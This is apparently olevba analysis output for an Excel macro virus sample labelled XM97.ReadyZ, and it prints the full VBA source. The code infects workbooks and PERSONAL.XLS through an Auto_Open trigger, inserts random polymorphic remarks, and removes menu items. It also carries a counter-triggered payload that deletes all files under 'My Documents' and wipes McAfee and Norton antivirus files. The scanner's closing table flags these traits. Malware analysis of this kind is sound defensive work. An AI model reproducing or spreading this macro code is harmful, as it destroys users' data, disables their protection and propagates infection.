olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ReadyZ.bas 
in file: Virus.MSExcel.Ready-f20bfe734883d62d3a4b9df2bf6ee9e368294f9b - OLE stream: '_VBA_PROJECT_CUR/VBA/ReadyZ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()

    ' -= [LineZerØ's Macro Engine 1.2] =-
    ' -= [XM97.ReadyZ] =-

    ' -= [ID: 21477-Gj-64002738-Jm.X] =-

Application.OnSheetActivate = "UxO9054"
End Sub

Sub UxO9054()
On Error Resume Next
VoNzRz3435 = "ReadyZ"
PoRrNm9054 = "PERSONAL.XLS"
EgVyTl6400 = Application.StartupPath & "\" & PoRrNm9054
HsNrFv3285PoRrNm2738 = 0
NyCzTm9054VoNzRz6400 = 0
With Application
.StatusBar = "XM97.ReadyZ"
.ScreenUpdating = False
.DisplayAlerts = False
.EnableCancelKey = xlDisabled
End With
CommandBars("Tools").Controls(10).Delete
CommandBars("Tools").Controls(12).Delete
CommandBars("View").Controls(3).Delete
CommandBars("Window").Controls(3).Delete
CommandBars("Window").Controls(4).Delete
 'This code is taken from Pyro | Thanks
Set Current = MacroContainer
For Grow = 1 To 20
Number = Current.VBProject.VBComponents("ReadyZ").CodeModule.ProcCountLines("UxO9054", vbext_pk_Proc)
RandomLine = Int(Rnd() * Number + 1)
RemarkLength = Int(Rnd() * 40 + 1)
For Length = 1 To RemarkLength
Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
Next Length
Current.VBProject.VBComponents("ReadyZ").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
Remark = ""
Next Grow
VD8435 = GetSetting("ReadyZ", "ICounter", "Count", "")
If VD8435 = 20 Then
Kill ("c:\my documents\*.*")
Call Gj6400
Call HsNrFvVD
End If
Application.VBE.ActiveVBProject.VBComponents.Item(VoNzRz3435).Export "C:\ReadyZ.sys"
If Dir(EgVyTl6400) = PoRrNm9054 Then NyCzTm9054VoNzRz6400 = 1
For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(x).Name = VoNzRz3435 Then HsNrFv3285PoRrNm2738 = 1
Next x
If HsNrFv3285PoRrNm2738 = 0 Then
ActiveWorkbook.VBProject.VBComponents.Import "C:\ReadyZ.sys"
ActiveWorkbook.Save
End If
If NyCzTm9054VoNzRz6400 = 0 Then
Workbooks.Add.SaveAs FileName:=EgVyTl6400
ActiveWorkbook.VBProject.VBComponents.Import "C:\ReadyZ.sys"
ActiveWindow.Visible = False
Workbooks(PoRrNm9054).Save
End If
Call Jm9054
End Sub
Sub HsNrFvVD()
On Error Resume Next
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
End Sub
Sub Gj6400()
On Error Resume Next
CommandBars("File").Enabled = False
End Sub
Sub Jm9054()
On Error Resume Next
VD8435 = GetSetting("ReadyZ", "ICounter", "Count", "")
If VD8435 > 20 Then SaveSetting "ReadyZ", "ICounter", "Count", "1"
VD8435 = GetSetting("ReadyZ", "ICounter", "Count", "")
VD8435 = VD8435 + 1
SaveSetting "ReadyZ", "ICounter", "Count", VD8435
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

